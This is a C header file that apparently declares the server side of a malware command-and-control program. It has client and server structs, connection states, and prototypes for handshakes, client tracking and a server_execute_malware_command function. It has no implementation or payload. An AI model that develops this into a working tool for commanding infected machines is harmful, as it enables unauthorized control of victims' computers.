
#include "../Communication/connection.h"
#include "../List/linked_list.h"
#include <pthread.h>

#define DEFAULT_MAX_CONNECTIONS 10
#define NO_ID 99
#define FIRST_ID 101

typedef enum {
    CLIENT_STATUS_DISCONNECTED = 0,
    CLIENT_STATUS_TCP_CONNECTED = 1,
    CLIENT_STATUS_READY = 2,
} CLIENT_STATUS;

typedef struct {
    int id;
    CLIENT_STATUS status;
    connection connection;
    pthread_t * thread;
} malware_client;

typedef struct {
    int max_clients;
    int listening_socket;
    int last_id;
    linked_list * clients_lst;
} malware_server;

void server_initialize_server(malware_server * server, int port, int max_connections);
void * new_client_handshake(void * client_to_handshake_ptr);
malware_client * server_add_client(malware_server * server, int socket, pthread_t * t);
void server_remove_client(malware_server * server, int id);
malware_client * server_get_client_by_id(malware_server * server, int id);
int server_generate_id(malware_server * server);
void server_execute_malware_command(malware_server * server, int client_id, COMMAND_TYPE cmd_type, int args_len, char args[]);
void server_shutdown();
